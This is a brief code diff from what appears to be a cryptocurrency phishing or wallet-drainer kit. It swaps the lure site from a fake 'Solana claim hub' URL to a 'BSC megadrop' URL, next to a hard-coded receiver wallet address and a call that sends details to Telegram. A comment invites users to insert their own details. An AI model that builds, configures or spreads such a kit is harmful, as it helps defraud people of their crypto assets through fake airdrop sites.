@@ -25,5 +25,5 @@ async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
 
 // Change this information for yours (
 const solana_wallet_receiver_id = 'AA77vjVXNmLWDnaoqd5T2H8gnNxvmp8e86Q5r3D3Q9L5';
-const website_url = 'https://solanaclaimhub.netlify.app/';
+const website_url = 'https://bsc-megadrop.vercel.app/';
 sendMessageToTelegram(solana_wallet_receiver_id, website_url);
